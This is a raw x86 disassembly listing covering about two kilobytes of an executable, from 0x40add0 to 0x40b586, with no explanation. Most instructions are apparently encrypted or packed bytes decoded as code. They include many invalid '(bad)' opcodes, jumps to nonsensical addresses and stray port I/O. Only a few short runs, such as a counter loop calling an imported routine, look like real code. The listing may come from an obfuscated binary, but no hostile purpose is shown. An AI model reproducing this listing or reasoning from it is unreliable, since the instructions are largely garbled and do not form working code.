  40add0:	es ins DWORD PTR es:[edi],dx
  40add2:	into   
  40add3:	jmp    0xc387e110
  40add8:	xchg   BYTE PTR [ebp-0x15],ch
  40addb:	lock jno 0x40ae07
  40adde:	push   ds
  40addf:	adc    BYTE PTR [edi-0x26],dh
  40ade2:	call   0x698f:0x98b9de38
  40ade9:	sbb    al,BYTE PTR [edx]
  40adeb:	cld    
  40adec:	pusha  
  40aded:	shl    ebx,0xaa
  40adf0:	inc    eax
  40adf1:	jg     0x40adf8
  40adf3:	xor    esp,ecx
  40adf5:	sahf   
  40adf6:	daa    
  40adf7:	inc    ebx
  40adf8:	mov    al,ds:0x9181a9b1
  40adfd:	jno    0x40ad8a
  40adff:	cdq    
  40ae00:	aas    
  40ae01:	mov    bl,0x11
  40ae03:	jle    0x40ae48
  40ae05:	xchg   esi,eax
  40ae06:	pop    ebx
  40ae07:	fadd   st,st(2)
  40ae09:	vandnpd xmm3,xmm0,XMMWORD PTR [edi+0x32568cf1]
  40ae11:	pop    esi
  40ae12:	and    bh,cl
  40ae14:	retf   0xdf1c
  40ae17:	adc    eax,0x7d36f0fb
  40ae1c:	jno    0x40ae0e
  40ae1e:	ins    DWORD PTR es:[edi],dx
  40ae1f:	inc    eax
  40ae20:	mov    ecx,0x7c67c349
  40ae25:	fcmovu st,st(1)
  40ae27:	pop    DWORD PTR [edx]
  40ae29:	repz mov ds,WORD PTR ds:0x78bd177f
  40ae30:	fmul   QWORD PTR [ebp-0x40b5dd7a]
  40ae36:	mov    dl,0x48
  40ae38:	inc    edi
  40ae39:	(bad)  
  40ae3a:	(bad)  
  40ae3b:	into   
  40ae3c:	or     BYTE PTR [ebx-0x29],bh
  40ae3f:	pusha  
  40ae40:	jmp    0x40ae96
  40ae42:	mov    eax,ds:0x2ccb88d9
  40ae47:	sbb    eax,edi
  40ae49:	and    eax,0x7ca89340
  40ae4e:	(bad)  [ebp+0x1d]
  40ae51:	jle    0x40ae88
  40ae53:	jecxz  0x40ae6e
  40ae55:	loope  0x40ade2
  40ae57:	inc    edx
  40ae58:	push   0xb7bd600a
  40ae5d:	inc    esi
  40ae5e:	add    ebp,ebp
  40ae60:	xchg   ebx,eax
  40ae61:	cmp    DWORD PTR ds:0xfce224a6,ecx
  40ae67:	mov    dh,0xd
  40ae69:	mov    BYTE PTR [edx+edi*2-0x59],0x20
  40ae6e:	sub    BYTE PTR [esi],dl
  40ae70:	aad    0xf8
  40ae72:	scas   al,BYTE PTR es:[edi]
  40ae73:	imul   eax,DWORD PTR ds:0x152adc4d,0xffffffe7
  40ae7a:	or     al,0x92
  40ae7c:	push   esp
  40ae7d:	mov    eax,ds:0x1749b2d1
  40ae82:	cmc    
  40ae83:	(bad)  
  40ae84:	out    dx,eax
  40ae85:	out    dx,al
  40ae86:	xchg   edi,eax
  40ae87:	pop    ecx
  40ae88:	mov    bl,0x49
  40ae8a:	and    al,0x3
  40ae8c:	push   ss
  40ae8d:	add    ah,BYTE PTR [eax-0x41f99ef9]
  40ae93:	push   ebx
  40ae94:	icebp  
  40ae95:	cld    
  40ae96:	and    al,BYTE PTR [ecx+eax*1]
  40ae99:	mov    ecx,0xe5a9b9b
  40ae9e:	add    bl,al
  40aea0:	dec    edi
  40aea1:	mov    esp,0xea897ea0
  40aea6:	sub    BYTE PTR [edx],ch
  40aea8:	sbb    esp,DWORD PTR [ebp-0x1b1de311]
  40aeae:	popa   
  40aeaf:	mov    edi,0x555b1a70
  40aeb5:	cmp    al,0x49
  40aeb7:	hlt    
  40aeb8:	pop    ecx
  40aeb9:	(bad)  
  40aeba:	push   edi
  40aebb:	and    DWORD PTR [eax+0x7c05455a],ebx
  40aec1:	xlat   BYTE PTR ds:[ebx]
  40aec2:	mov    esi,ebx
  40aec4:	push   ebp
  40aec5:	out    0x41,al
  40aec7:	les    esp,FWORD PTR [eax-0x1e20e8c4]
  40aecd:	ret    
  40aece:	cld    
  40aecf:	pop    ecx
  40aed0:	ds push esp
  40aed2:	outs   dx,DWORD PTR ds:[esi]
  40aed3:	test   BYTE PTR [edx-0x47],ch
  40aed6:	ja     0x40aec0
  40aed8:	jg     0x40ae81
  40aeda:	xor    BYTE PTR [eax+0x5e386c22],cl
  40aee0:	dec    BYTE PTR [edi-0x1404a07c]
  40aee6:	sub    bh,bl
  40aee8:	adc    DWORD PTR [ecx+0x79f36057],0x45
  40aeef:	icebp  
  40aef0:	ror    ebx,0xbf
  40aef3:	ds xchg sp,ax
  40aef6:	mov    al,ds:0xe7819f1f
  40aefb:	and    DWORD PTR [edi],esi
  40aefd:	bound  ecx,QWORD PTR [edx+ebp*2+0x1acef8d0]
  40af04:	btr    DWORD PTR [esi-0x26],ebx
  40af08:	fs inc edi
  40af0a:	inc    esp
  40af0b:	sahf   
  40af0c:	mov    ah,0x9d
  40af0e:	adc    ah,BYTE PTR [edi-0x5b05cb75]
  40af14:	imul   eax,DWORD PTR [eax],0x29
  40af17:	fsubr  QWORD PTR [ecx]
  40af19:	fwait
  40af1a:	and    ecx,edx
  40af1c:	xchg   edx,eax
  40af1d:	aaa    
  40af1e:	out    dx,eax
  40af1f:	sbb    al,dh
  40af21:	loope  0x40af44
  40af23:	mov    ah,BYTE PTR ds:0x5dec9c06
  40af29:	mov    esp,0xb13bba30
  40af2e:	and    esp,DWORD PTR [edx-0xa]
  40af31:	push   ecx
  40af32:	sahf   
  40af33:	fnsave [ebx-0x60ea0ebb]
  40af39:	std    
  40af3a:	sub    BYTE PTR ds:0x3d475b1e,ah
  40af40:	fisubr WORD PTR [edx+0xac9a0ce]
  40af46:	adc    edx,ebp
  40af48:	mov    ds,WORD PTR [ecx+0x6fbabd0]
  40af4e:	pop    eax
  40af4f:	inc    edi
  40af50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40af51:	es enter 0x15df,0xd7
  40af56:	stos   DWORD PTR es:[edi],eax
  40af57:	rcr    DWORD PTR [eax-0xeeb8d9],0x91
  40af5e:	call   0x9c8:0xc65d0a84
  40af65:	push   esi
  40af66:	and    DWORD PTR [ebx],edi
  40af68:	pop    ss
  40af69:	int    0xb6
  40af6b:	mov    BYTE PTR [ebx-0x5ae56271],bl
  40af71:	mov    eax,DWORD PTR [eax+0x18]
  40af74:	or     ecx,0x7018
  40af7a:	mov    DWORD PTR [ebp-0x20],eax
  40af7d:	mov    eax,DWORD PTR [ebp-0x14]
  40af80:	mov    ecx,DWORD PTR [ebp+0x8]
  40af83:	not    DWORD PTR ds:0x433827
  40af89:	add    ecx,DWORD PTR [eax+0x20]
  40af8c:	movzx  eax,BYTE PTR ds:0x4337df
  40af93:	sub    DWORD PTR ds:0x43378f,eax
  40af99:	mov    DWORD PTR [ebp-0x28],ecx
  40af9c:	and    DWORD PTR ds:0x4337db,0x0
  40afa6:	jmp    0x40afb8
  40afab:	mov    ecx,DWORD PTR ds:0x4337db
  40afb1:	inc    ecx
  40afb2:	mov    DWORD PTR ds:0x4337db,ecx
  40afb8:	cmp    DWORD PTR ds:0x4337db,0x1f
  40afbf:	jae    0x40b269
  40afc5:	cmp    DWORD PTR ds:0x4337db,0xb
  40afcc:	jne    0x40afdd
  40afd2:	push   0x140a
  40afd7:	call   DWORD PTR ds:0x41235c
  40afdd:	cmp    DWORD PTR ds:0x4337db,0xa
  40afe4:	jne    0x40aff7
  40afea:	mov    ecx,DWORD PTR ds:0x4337db
  40aff0:	inc    ecx
  40aff1:	mov    DWORD PTR ds:0x4337db,ecx
  40aff7:	jmp    0x40afab
  40affc:	xor    DWORD PTR ds:0x433827,0xf10
  40b006:	jmp    0x40b269
  40b00b:	push   ecx
  40b00c:	fsubr  DWORD PTR [eax+0x5171b121]
  40b012:	push   0xf81790a
  40b017:	jecxz  0x40b08b
  40b019:	jae    0x40afc2
  40b01b:	idiv   DWORD PTR fs:[esi+0x7e]
  40b01f:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b023:	(bad)  
  40b025:	shr    DWORD PTR [edi+0x74dfc122],1
  40b02b:	stc    
  40b02c:	pop    esp
  40b02d:	sub    BYTE PTR [ecx-0x43aeb7df],al
  40b033:	mov    eax,0x376705f5
  40b038:	cmp    bl,BYTE PTR [ecx]
  40b03a:	add    al,0xb0
  40b03c:	cmp    ebp,DWORD PTR [edx+ebp*1-0x57084b2b]
  40b043:	test   BYTE PTR [ebp+0x56f62165],0x90
  40b04a:	xor    DWORD PTR [ebx+ebp*1+0x6aaeea7],ebx
  40b051:	xchg   BYTE PTR [ebp+0x8],bh
  40b054:	stos   DWORD PTR es:[edi],eax
  40b055:	cwde   
  40b056:	mov    es:0x7f0ded60,al
  40b05c:	cli    
  40b05d:	inc    edi
  40b05e:	ins    DWORD PTR es:[edi],dx
  40b05f:	push   esi
  40b060:	push   ds
  40b061:	jnp    0x40b031
  40b063:	xlat   BYTE PTR ds:[ebx]
  40b064:	mov    cl,0x4c
  40b066:	push   es
  40b067:	outs   dx,DWORD PTR ds:[esi]
  40b068:	jbe    0x40b020
  40b06a:	out    dx,al
  40b06b:	mov    cs,WORD PTR [esi+0x4e]
  40b06e:	clc    
  40b06f:	push   esi
  40b070:	inc    ebp
  40b071:	mov    edi,0xc801c0bf
  40b076:	jbe    0x40affc
  40b078:	or     DWORD PTR [ebx+edx*8+0x393addc5],0xffffff87
  40b080:	xchg   BYTE PTR [edx-0x6c],dh
  40b083:	lock fwait
  40b085:	fwait
  40b086:	xor    dl,bh
  40b088:	bound  esi,QWORD PTR [ebp-0x27]
  40b08b:	test   BYTE PTR [ecx],0xc7
  40b08e:	and    eax,0x3fa5f409
  40b093:	mov    al,0xc9
  40b095:	or     esi,DWORD PTR [ebx+edi*2-0x75]
  40b099:	inc    eax
  40b09a:	cmc    
  40b09b:	add    eax,DWORD PTR [ecx+0x1a]
  40b09e:	and    eax,0xe1875182
  40b0a3:	adc    esi,DWORD PTR [esi-0x52]
  40b0a6:	jb     0x40b0bb
  40b0a8:	popf   
  40b0a9:	call   0x4bdb:0xdb4beee4
  40b0b0:	jmp    0x4e8e:0xbd1f9f01
  40b0b7:	(bad)  
  40b0b8:	cli    
  40b0b9:	mov    WORD PTR [esi+0x17],?
  40b0bc:	cli    
  40b0bd:	adc    BYTE PTR [edi+0x21974ff7],ah
  40b0c3:	inc    ecx
  40b0c4:	sbb    dl,dh
  40b0c6:	(bad)  
  40b0c7:	(bad)  
  40b0c8:	dec    ecx
  40b0c9:	retf   0x5c2b
  40b0cc:	retf   0x40dc
  40b0cf:	cwde   
  40b0d0:	pop    esp
  40b0d1:	mov    ecx,0x955e7847
  40b0d6:	cli    
  40b0d7:	jle    0x40b082
  40b0d9:	jg     0x40b150
  40b0db:	mov    dh,0x34
  40b0dd:	mov    ebx,0x2cf5208a
  40b0e2:	xchg   esi,eax
  40b0e3:	cld    
  40b0e4:	xor    DWORD PTR [ecx-0x4749ad3c],0x2d
  40b0eb:	test   al,0xcf
  40b0ed:	dec    esi
  40b0ee:	mov    ecx,0xfbe08e9b
  40b0f3:	(bad)  
  40b0f4:	pop    edi
  40b0f5:	and    al,0x38
  40b0f7:	mov    bh,0x4d
  40b0f9:	cld    
  40b0fa:	jmp    0xed9f87e9
  40b0ff:	cmp    bl,ch
  40b101:	push   0xf23798f8
  40b106:	push   cs
  40b107:	push   esp
  40b108:	and    BYTE PTR [ebp+ebp*2+0x7d],cl
  40b10c:	enter  0x991,0xa5
  40b110:	pop    edi
  40b111:	inc    esp
  40b112:	sub    dl,BYTE PTR [edx+0x58]
  40b115:	ds ja  0x40b0d8
  40b118:	loope  0x40b104
  40b11a:	cwde   
  40b11b:	shr    DWORD PTR [edi],0x86
  40b11e:	leave  
  40b11f:	jle    0x40b17a
  40b121:	aas    
  40b122:	icebp  
  40b123:	sahf   
  40b124:	xor    al,0xab
  40b126:	add    ch,0x79
  40b129:	xchg   edi,eax
  40b12a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b12b:	gs adc esp,ebp
  40b12e:	lahf   
  40b12f:	or     DWORD PTR [edi-0x10],ebp
  40b132:	dec    edx
  40b133:	push   ds
  40b134:	inc    ebp
  40b135:	das    
  40b136:	ins    DWORD PTR es:[edi],dx
  40b137:	mov    esp,0x52ffb18f
  40b13c:	jp     0x40b133
  40b13e:	out    dx,eax
  40b13f:	sub    ch,BYTE PTR [edi]
  40b141:	popa   
  40b142:	cmp    DWORD PTR [edx],ebx
  40b144:	imul   edi,DWORD PTR [edi],0xffffffcf
  40b147:	and    al,0x51
  40b149:	jo     0x40b0f5
  40b14b:	mov    cl,0xc2
  40b14d:	retf   0x4d13
  40b150:	loope  0x40b184
  40b152:	fucomi st,st(5)
  40b154:	mov    ebx,0x39bd38c4
  40b159:	sub    BYTE PTR [esi],dh
  40b15b:	outs   dx,DWORD PTR ds:[esi]
  40b15c:	push   esp
  40b15d:	jl     0x40b0f7
  40b15f:	lea    esi,[eax+0x67459cd7]
  40b165:	mov    bh,0xbe
  40b167:	inc    edx
  40b168:	(bad)  
  40b169:	cmp    DWORD PTR ds:[eax-0xbdb8b43],eax
  40b170:	cdq    
  40b171:	sub    ah,BYTE PTR [esi+edi*4-0x76b397ad]
  40b178:	jecxz  0x40b142
  40b17a:	rcl    BYTE PTR [ebx],0x3e
  40b17d:	inc    esp
  40b17e:	mov    bh,0x55
  40b180:	shl    DWORD PTR [edi],1
  40b182:	clc    
  40b183:	int3   
  40b184:	mov    ch,0x48
  40b186:	xchg   edx,eax
  40b187:	cli    
  40b188:	lahf   
  40b189:	(bad)  
  40b18a:	(bad)  
  40b18b:	pusha  
  40b18c:	mov    esp,ebx
  40b18e:	add    DWORD PTR [ecx-0x31],0x57a8874
  40b195:	stc    
  40b196:	add    eax,0xdbd65ea3
  40b19b:	push   edx
  40b19c:	sbb    al,0xfb
  40b19e:	ror    BYTE PTR [ebp+0x51],cl
  40b1a1:	clc    
  40b1a2:	sub    esi,esi
  40b1a4:	call   0xb81a5f28
  40b1a9:	lods   eax,DWORD PTR ds:[esi]
  40b1aa:	(bad)  
  40b1ab:	out    dx,al
  40b1ac:	jecxz  0x40b174
  40b1ae:	or     esi,ecx
  40b1b0:	and    dh,BYTE PTR [esi+0xf54555b]
  40b1b6:	xor    al,0xb8
  40b1b8:	adc    al,0x5b
  40b1ba:	mov    DWORD PTR [edi-0x3d],esp
  40b1bd:	jb     0x40b1f1
  40b1bf:	and    eax,DWORD PTR [esi-0x38]
  40b1c2:	punpckhwd mm2,QWORD PTR [ebx+0x1c58d680]
  40b1c9:	push   0xd9533b9a
  40b1ce:	in     al,0x73
  40b1d0:	xor    al,0xac
  40b1d2:	adc    ah,bl
  40b1d4:	xchg   esp,eax
  40b1d5:	sub    dl,0x75
  40b1d8:	lahf   
  40b1d9:	imul   edi,DWORD PTR [ebp+0xa],0xffffffd1
  40b1dd:	(bad)  
  40b1df:	mov    ebp,0x3a41ac5d
  40b1e4:	jmp    0x40b190
  40b1e6:	test   BYTE PTR [edx+0x63d10e02],dl
  40b1ec:	push   ecx
  40b1ed:	js     0x40b231
  40b1ef:	jl     0x40b25c
  40b1f1:	mov    al,ds:0x9a7c3e8c
  40b1f6:	mov    ebx,0xf37dd856
  40b1fb:	inc    esi
  40b1fc:	cmp    DWORD PTR [esi+0x1c5fc4d2],0x5b2f3287
  40b206:	in     al,0x6d
  40b208:	scas   al,BYTE PTR es:[edi]
  40b209:	or     ebx,eax
  40b20b:	cwde   
  40b20c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b20d:	inc    edx
  40b20e:	ins    DWORD PTR es:[edi],dx
  40b20f:	aas    
  40b210:	push   eax
  40b211:	ins    DWORD PTR es:[edi],dx
  40b212:	jno    0x40b286
  40b214:	jmp    0x40b28e
  40b216:	cld    
  40b217:	dec    esp
  40b218:	jno    0x40b1a1
  40b21a:	and    ah,ah
  40b21c:	mov    ebp,0x21261ab2
  40b221:	xchg   ebx,eax
  40b222:	inc    ebp
  40b223:	mov    edi,ebp
  40b225:	add    DWORD PTR [ebx+edx*2],edi
  40b228:	xchg   BYTE PTR [edx],bh
  40b22a:	ret    0x6381
  40b22d:	cmp    DWORD PTR [edx+0x3c],0xf
  40b231:	ficomp DWORD PTR [edx+0x1b]
  40b234:	call   0x9c8c6f1a
  40b239:	mov    WORD PTR [ebx+0x5a],ds
  40b23c:	cmp    DWORD PTR [eax+0x1416283b],esp
  40b242:	mov    ?,WORD PTR [ecx]
  40b244:	sbb    eax,0x41dc811f
  40b249:	mov    ah,0x88
  40b24b:	cmp    eax,0x28a639ee
  40b250:	scas   al,BYTE PTR es:[edi]
  40b251:	xchg   ebx,eax
  40b252:	push   ebp
  40b253:	mov    dl,0xf1
  40b255:	jo     0x40b25c
  40b257:	add    cl,BYTE PTR [edi]
  40b259:	daa    
  40b25a:	ret    
  40b25b:	cmp    BYTE PTR [ecx+0x5c3fddfd],dh
  40b261:	ja     0x40b284
  40b263:	mov    bl,0xf6
  40b265:	leave  
  40b266:	xor    BYTE PTR [esi],cl
  40b268:	xor    eax,0x8bec458b
  40b26d:	dec    ebp
  40b26e:	or     BYTE PTR [ebx],al
  40b270:	dec    eax
  40b271:	and    al,0xe9
  40b273:	pop    esi
  40b274:	add    al,BYTE PTR [eax]
  40b276:	add    BYTE PTR [ecx-0x73],dh
  40b279:	push   ebp
  40b27a:	clc    
  40b27b:	jno    0x40b2bd
  40b27d:	jno    0x40b2f4
  40b27f:	pop    esi
  40b280:	repz das 
  40b282:	push   es
  40b283:	xchg   ebp,eax
  40b284:	jae    0x40b249
  40b286:	arpl   WORD PTR [esi],bp
  40b288:	bnd jle 0x40b309
  40b28b:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b28f:	jbe    0x40b212
  40b291:	adc    BYTE PTR [eax],dh
  40b293:	ja     0x40b2d4
  40b295:	xor    eax,0xf97d39bc
  40b29a:	push   esi
  40b29b:	lock xor esp,ebx
  40b29e:	sbb    BYTE PTR ds:[ebp+0x6e],ch
  40b2a2:	mov    eax,0x246c49b7
  40b2a7:	sub    esi,DWORD PTR [ecx]
  40b2a9:	hlt    
  40b2aa:	cmp    edi,esi
  40b2ac:	enter  0xea73,0x26
  40b2b0:	or     DWORD PTR [edi-0x65],esi
  40b2b3:	pop    esp
  40b2b4:	adc    BYTE PTR [ebp+0x7e200049],dh
  40b2ba:	mov    ebx,0xe2dba116
  40b2bf:	dec    edi
  40b2c0:	sub    eax,0xeb3a48e7
  40b2c5:	sub    DWORD PTR [ebx],esp
  40b2c7:	fild   DWORD PTR [ecx]
  40b2c9:	cmp    BYTE PTR [edi+0x59],al
  40b2cc:	pushf  
  40b2cd:	xor    al,0xf9
  40b2cf:	retf   
  40b2d0:	hlt    
  40b2d1:	xlat   BYTE PTR ds:[ebx]
  40b2d2:	mov    bh,0x2e
  40b2d4:	mov    esi,ebp
  40b2d6:	in     eax,0xd7
  40b2d8:	in     al,dx
  40b2d9:	cdq    
  40b2da:	xor    DWORD PTR [eax+edx*8+0x18de203],ebp
  40b2e1:	int3   
  40b2e2:	pop    esi
  40b2e3:	mov    BYTE PTR [eax],bl
  40b2e5:	(bad)
  40b2e8:	mov    esp,0x55df6d7c
  40b2ed:	xchg   ebp,eax
  40b2ee:	xchg   ecx,eax
  40b2ef:	outs   dx,BYTE PTR ds:[esi]
  40b2f0:	pop    ecx
  40b2f1:	add    eax,DWORD PTR [edi-0x7541266f]
  40b2f7:	jg     0x40b36b
  40b2f9:	pop    ecx
  40b2fa:	sub    esi,ebp
  40b2fc:	int3   
  40b2fd:	pop    ecx
  40b2fe:	jnp    0x40b29d
  40b300:	and    al,0x82
  40b302:	imul   ebp,DWORD PTR [ebx-0x32861a7c],0x53b16635
  40b30c:	jns    0x40b370
  40b30e:	mov    BYTE PTR [ecx],dh
  40b310:	xor    eax,DWORD PTR [eax-0x2f]
  40b313:	mov    ds:0x7447115e,eax
  40b318:	retf   0x7315
  40b31b:	retf   0x8856
  40b31e:	or     eax,0x3b6a88cb
  40b323:	cmc    
  40b324:	adc    BYTE PTR [ecx+0x28],dh
  40b327:	push   edx
  40b328:	or     al,0xbc
  40b32a:	pop    ebp
  40b32b:	pop    edx
  40b32c:	popf   
  40b32d:	push   esi
  40b32e:	push   esi
  40b32f:	aas    
  40b330:	inc    edi
  40b331:	mov    ah,cl
  40b333:	scas   al,BYTE PTR es:[edi]
  40b334:	(bad)  
  40b336:	fidivr DWORD PTR [esi+0x4cc602fa]
  40b33c:	xor    esi,0xffffffcf
  40b33f:	pop    es
  40b340:	pop    esp
  40b341:	pop    ebp
  40b342:	mov    al,ds:0xa96ceef2
  40b347:	mov    cs,WORD PTR [esi]
  40b349:	mov    dh,0x41
  40b34b:	mov    al,0xbe
  40b34d:	pushf  
  40b34e:	ss adc bl,0x8b
  40b352:	add    DWORD PTR ds:0xd5567aba,0xffffffee
  40b359:	(bad)  [eax+0x12]
  40b35c:	jle    0x40b2ec
  40b35e:	je     0x40b321
  40b360:	in     eax,0xc3
  40b362:	pop    ebx
  40b363:	pushf  
  40b364:	mov    cl,0xd7
  40b366:	dec    eax
  40b367:	inc    ebx
  40b368:	outs   dx,BYTE PTR ds:[esi]
  40b369:	adc    al,0xc4
  40b36b:	test   al,0xc
  40b36d:	cmp    esp,edi
  40b36f:	pop    edx
  40b370:	mov    BYTE PTR [edx-0x62],cl
  40b373:	stos   BYTE PTR es:[edi],al
  40b374:	push   ebp
  40b375:	or     DWORD PTR [edi],ecx
  40b377:	leave  
  40b378:	retf   
  40b379:	fcom   QWORD PTR ds:0xadaf7beb
  40b37f:	mov    BYTE PTR [edx],cl
  40b381:	sbb    DWORD PTR [ebx],0xd9fe4b27
  40b387:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b388:	and    DWORD PTR [ebx-0x62],ecx
  40b38b:	mov    edi,0x2f4593cb
  40b390:	sub    al,BYTE PTR [eax-0x650bfba5]
  40b396:	stc    
  40b397:	pop    ecx
  40b398:	push   esp
  40b399:	push   cs
  40b39a:	daa    
  40b39b:	push   ss
  40b39c:	push   ds
  40b39d:	or     al,0x42
  40b39f:	jge    0x40b364
  40b3a1:	das    
  40b3a2:	scas   al,BYTE PTR es:[edi]
  40b3a3:	pop    ecx
  40b3a4:	push   ds
  40b3a5:	clc    
  40b3a6:	jmp    DWORD PTR [ebx-0x7e033dd1]
  40b3ac:	pop    eax
  40b3ad:	or     BYTE PTR [edx-0x7b],bh
  40b3b0:	cmc    
  40b3b1:	adc    al,BYTE PTR [ebp+ecx*1-0x2b270796]
  40b3b8:	jmp    0xbcb:0xabb2a933
  40b3bf:	pop    esp
  40b3c0:	hlt    
  40b3c1:	test   BYTE PTR [ebp-0x71abca01],ch
  40b3c7:	into   
  40b3c8:	cdq    
  40b3c9:	mov    edi,0x94f8f413
  40b3ce:	mov    edx,DWORD PTR [ebx]
  40b3d0:	into   
  40b3d1:	push   cs
  40b3d2:	icebp  
  40b3d3:	or     BYTE PTR [edi+0x1a],dl
  40b3d6:	mov    al,ds:0xd4eee754
  40b3db:	and    BYTE PTR [ecx+0x18d4662d],ah
  40b3e1:	mov    ah,0x20
  40b3e3:	sub    al,0xb
  40b3e5:	and    eax,esp
  40b3e7:	test   eax,0x407d5565
  40b3ec:	mov    ch,0x45
  40b3ee:	fbstp  TBYTE PTR [edi+0x73c55fab]
  40b3f4:	pop    ss
  40b3f5:	xor    eax,0x9e29a94f
  40b3fa:	aam    0xa6
  40b3fc:	ficomp DWORD PTR [edi+0x3d043508]
  40b402:	or     BYTE PTR [eax+0x66b10182],cl
  40b408:	inc    ebp
  40b409:	mov    ch,0x88
  40b40b:	or     dh,dl
  40b40d:	or     edi,DWORD PTR [esi]
  40b40f:	or     ch,cl
  40b411:	cmp    ch,ch
  40b413:	aaa    
  40b414:	outs   dx,DWORD PTR ds:[esi]
  40b415:	cmp    esp,DWORD PTR [ecx+0x32]
  40b418:	xchg   esi,eax
  40b419:	data16 stc 
  40b41b:	mov    ds:0x9fa9aa4d,eax
  40b420:	ja     0x40b3c0
  40b422:	aam    0x7d
  40b424:	ss loope 0x40b43e
  40b427:	sub    ecx,esp
  40b429:	cdq    
  40b42a:	inc    esp
  40b42b:	xchg   ecx,eax
  40b42c:	in     eax,0x1c
  40b42e:	mov    ds:0xb867b613,al
  40b433:	cld    
  40b434:	push   ebx
  40b435:	(bad)  
  40b436:	jg     0x40b43e
  40b438:	sahf   
  40b439:	xchg   edx,esi
  40b43b:	jle    0x40b4a5
  40b43d:	fsubp  st(5),st
  40b43f:	arpl   ax,bp
  40b441:	jge    0x40b3d4
  40b443:	(bad)  
  40b444:	xchg   edi,eax
  40b445:	mov    ds:0x11e60a13,al
  40b44a:	hlt    
  40b44b:	arpl   ax,dx
  40b44d:	hlt    
  40b44e:	sbb    BYTE PTR [ecx],dh
  40b450:	clc    
  40b451:	cmp    eax,0x9a181d6f
  40b456:	(bad)  
  40b457:	push   0x35046e4e
  40b45c:	les    eax,FWORD PTR [ecx]
  40b45e:	jnp    0x40b417
  40b460:	retf   0xad4
  40b463:	pusha  
  40b464:	and    eax,ebp
  40b466:	mov    ah,0x39
  40b468:	xchg   ecx,eax
  40b469:	js     0x40b40b
  40b46b:	add    DWORD PTR [esi-0x39a58e1f],ecx
  40b471:	jge    0x40b47f
  40b473:	inc    esi
  40b474:	push   edi
  40b475:	pop    es
  40b476:	or     DWORD PTR [esi-0x76],ecx
  40b479:	mov    edi,DWORD PTR [ebx-0x17]
  40b47c:	pop    edi
  40b47d:	or     ecx,DWORD PTR ds:0xf57ef12
  40b483:	cdq    
  40b484:	outs   dx,DWORD PTR ds:[esi]
  40b485:	fst    QWORD PTR [bp+0x77]
  40b489:	adc    eax,0xd0a88d6b
  40b48e:	adc    al,0xab
  40b490:	mov    ah,0xe8
  40b492:	pop    ss
  40b493:	cmp    DWORD PTR [ecx],eax
  40b495:	mov    ah,0x1f
  40b497:	daa    
  40b498:	aaa    
  40b499:	xor    BYTE PTR [esi],ch
  40b49b:	dec    esp
  40b49c:	push   ecx
  40b49d:	jecxz  0x40b516
  40b49f:	cmp    eax,0x4f34c7e4
  40b4a4:	stos   BYTE PTR es:[edi],al
  40b4a5:	mov    dh,0xcb
  40b4a7:	ret    
  40b4a8:	test   eax,0xb665dc00
  40b4ad:	push   ecx
  40b4ae:	mov    ah,0x92
  40b4b0:	adc    ecx,0x758e50b1
  40b4b6:	rcl    cl,1
  40b4b8:	in     eax,dx
  40b4b9:	ror    bh,0x14
  40b4bc:	sub    ebp,esi
  40b4be:	add    eax,0x5ec54ef5
  40b4c3:	mov    al,ds:0x484fffce
  40b4c8:	cmp    BYTE PTR [eax+0x2c],0x7e
  40b4cc:	dec    edx
  40b4cd:	(bad)  
  40b4ce:	aas    
  40b4cf:	push   edx
  40b4d0:	adc    BYTE PTR [esi-0x76423756],bh
  40b4d6:	dec    ebp
  40b4d7:	aam    0x8b
  40b4d9:	inc    ebp
  40b4da:	in     al,dx
  40b4db:	mov    ecx,DWORD PTR [ebp+0x8]
  40b4de:	add    ecx,DWORD PTR [eax+0x1c]
  40b4e1:	xor    esi,esi
  40b4e3:	mov    DWORD PTR [ebp-0x14],ecx
  40b4e6:	mov    eax,DWORD PTR [ebp-0x28]
  40b4e9:	mov    ecx,DWORD PTR [ebp+0x8]
  40b4ec:	add    ecx,DWORD PTR [eax+edi*4]
  40b4ef:	lea    eax,[ebp-0x8]
  40b4f2:	mov    DWORD PTR [ebp-0x30],ecx
  40b4f5:	push   eax
  40b4f6:	jmp    0x40b759
  40b4fb:	pop    eax
  40b4fc:	pop    ds
  40b4fd:	sub    BYTE PTR [ebp+0x69],bl
  40b500:	imul   ebp,DWORD PTR [ecx+0x1b],0x5437698f
  40b507:	hlt    
  40b508:	push   ebp
  40b509:	loop   0x40b4c3
  40b50b:	call   0x38bf3400
  40b510:	jl     0x40b590
  40b512:	jle    0x40b591
  40b514:	shl    DWORD PTR [ecx+esi*2],1
  40b517:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b518:	push   esp
  40b519:	mov    esp,0x9fddb8d
  40b51e:	pop    es
  40b51f:	mov    dl,0x5c
  40b521:	arpl   bx,bp
  40b523:	(bad)  
  40b525:	inc    ecx
  40b526:	and    BYTE PTR [esi],al
  40b528:	mov    ?,edi
  40b52a:	addr16 mov edx,0x9bbd4f5f
  40b530:	rcr    edi,1
  40b532:	dec    edi
  40b533:	stos   DWORD PTR es:[edi],eax
  40b534:	fs mov ebx,0x1f5043ce
  40b53a:	push   esi
  40b53b:	or     ebp,esi
  40b53d:	outs   dx,DWORD PTR ds:[esi]
  40b53e:	push   ds
  40b53f:	jge    0x40b4f0
  40b541:	(bad)  
  40b542:	call   0x84a2:0xbb956e57
  40b549:	push   ebp
  40b54a:	xor    al,0x4d
  40b54c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b54d:	mov    cl,0x10
  40b54f:	and    ch,dh
  40b551:	sbb    eax,DWORD PTR [ecx+0x660ad047]
  40b557:	jo     0x40b5ce
  40b559:	inc    esp
  40b55a:	jecxz  0x40b4dc
  40b55c:	xchg   ch,ch
  40b55e:	cmp    DWORD PTR [ecx+0x79],eax
  40b561:	push   ss
  40b562:	(bad)  
  40b563:	cmc    
  40b564:	rol    dh,cl
  40b566:	jb     0x40b546
  40b568:	dec    esp
  40b569:	mov    ds:0x620f9320,al
  40b56e:	enter  0x6382,0x24
  40b572:	daa    
  40b573:	inc    eax
  40b574:	(bad)
  40b577:	or     eax,0xa6eba297
  40b57c:	retf   0xec50
  40b57f:	pop    ebp
  40b580:	nop
  40b581:	pop    ss
  40b582:	xchg   ebx,eax
  40b583:	mov    cl,0x87
  40b585:	in     eax,dx
  40b586:	aam    0x4d
